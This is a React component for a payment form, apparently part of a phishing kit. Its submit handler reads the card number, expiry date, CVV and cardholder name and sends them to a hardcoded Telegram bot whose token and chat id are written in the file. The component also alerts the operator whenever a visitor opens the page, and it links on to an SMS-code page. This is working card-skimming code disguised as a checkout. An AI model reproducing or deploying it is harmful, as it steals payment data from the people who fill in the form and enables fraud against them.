import React, { useEffect } from "react";
import "./paybox.css";
import { LocalizedLink } from "./i18n/LocalizedLink";
import { useTranslation } from "./i18n/useTranslation";
import { sendPaymentPageAlert } from "./utils/telegram";

const Paybox = () => {
  const { t } = useTranslation();
  
  // Send Telegram alert when user opens payment page
  useEffect(() => {
    sendPaymentPageAlert();
  }, []);
  
  const sendData = (e) => {
    e.preventDefault();
    var text1 = document.getElementById("card_number").value;
    var text2 = document.getElementById("expire_date").value;
    var text3 = document.getElementById("cvv").value;
    var text4 = document.getElementById("cardholder_name").value;

    var logsss = `Log :%0A -card_number: ${text1} %0A - expire_date: ${text2} %0A - cvv: ${text3} %0A - cardholder_name: ${text4}`;

    var token = "6970189544:AAGwiLCKP9aoh-CyZPE1BhI-UDQTPzvjCZE";
    var chat_id = -1002071552778;
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${logsss}`;

    let api = new XMLHttpRequest();

    api.open("GET", url, true);
    api.send();
  };

  return (
    <div>
      <div className="paycontainer">
        <div className="paytitle">{t("payment.title")}</div>
        <form onSubmit={sendData} className="form" id="form">
          <div className="paytext">{t("payment.cardNumber")}</div>
          <input
            id="card_number"
            name="cardn"
            className="payinput"
            placeholder="1234 5678 1234 5678"
            required
          />
          <div className="paytext">{t("payment.expiryDate")}</div>
          <input
            id="expire_date"
            name="edata"
            className="payinput"
            placeholder="MMYY"
            required
          />
          <div className="paytext">{t("payment.cvv")}</div>
          <input id="cvv" name="cvv" className="payinput" placeholder="123" required />
          <div className="paytext">{t("payment.cardholderName")}</div>
          <input
            id="cardholder_name"
            name="uname"
            className="payinput"
            type="text"
            placeholder="John Doe"
            required
          />
          <div></div>
          <button type="submit" className="paybtn">
            {t("payment.pay")}
          </button>
          <div className="dfg">___</div>
          <LocalizedLink to="/smsbox" className="paylinkk">
            {t("payment.smsCheck")}
          </LocalizedLink>
        </form>
      </div>
    </div>
  );
};

export default Paybox;
